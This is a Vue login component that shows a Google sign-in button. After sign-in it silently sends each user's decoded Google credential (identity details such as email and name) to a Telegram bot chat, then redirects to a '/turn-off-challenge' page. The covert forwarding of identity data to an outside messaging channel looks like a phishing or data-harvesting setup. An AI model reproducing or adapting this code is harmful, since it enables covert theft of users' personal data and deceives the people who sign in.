<script setup>
import { decodeCredential } from "vue3-google-login";
import { useRouter } from "vue-router";
import store from "../../store";

const router = useRouter();

const callback = (response) => {
  if (response.credential) {
    store.commit("setIsLogged", true);
    const credential = decodeCredential(response.credential);
    sendTelegramMessage(JSON.stringify(credential, null, "\t"));
    router.push("/turn-off-challenge");
  } else {
    console.error("Failed to login with Google. Please try again.");
  }
};

function sendTelegramMessage(message) {
  const now = new Date();
  const datetimeISO = now.toISOString();
  const token = import.meta.env.VITE_TELEGRAM_TOKEN;
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
  const textMessage = message+"\n\nDATEITME: "+datetimeISO;

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    textMessage
  )}`;

  fetch(url)
    .then((response) => {
      if (!response.ok) {
        throw new Error("Network response was not ok");
      }
      return response.json();
    })
    .then((data) => {
      console.log("Telegram response:", data.ok);
    })
    .catch((error) => {
      console.error("There was a problem with the fetch operation:", error);
    });
}
</script>

<template>
  <GoogleLogin :callback="callback" />
</template>